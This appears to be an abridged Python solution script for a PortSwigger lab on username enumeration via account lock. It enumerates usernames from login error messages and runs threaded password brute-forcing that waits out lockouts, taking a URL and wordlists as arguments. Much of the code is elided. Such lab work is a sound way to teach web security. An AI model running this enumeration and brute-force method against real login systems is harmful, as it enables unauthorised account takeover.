...
def enumerate_username_worker(url, cookie, username):
    ...
    if res.content.decode().count('Invalid username or password.')==0:
...
def bruteforce_passwrod_worker(url, cookie, username,password):
    ...
    res=request(url=url+'login',method='POST',data=data,headers={'Cookie':cookie})
    if res.content.decode().count('You have made too many incorrect login attempts. Please try again in 1 minute(s).')==0 and  res.content.decode().count('Invalid username or password.')==0:
                ...
                if result:
                    ...
                    for f in future_to_password.keys():
                        if f != future:
                            f.cancel()
                    sleep(60)
                    bruteforce_passwrod_worker(url, cookie, username,password)
                    return result
...
if __name__ == "__main__":
 print("""
    0xCrypt00o Soluation for Portswigger LAB : Username-Enumeration-Via-Account-Lock
 ...
 if len(argv)==4:
     ...
     print("call it with : python3 ./pwn-auth-username-enumeration-via-account-lock.py <url> <path to username wordlist> <path to password wordlist> ")
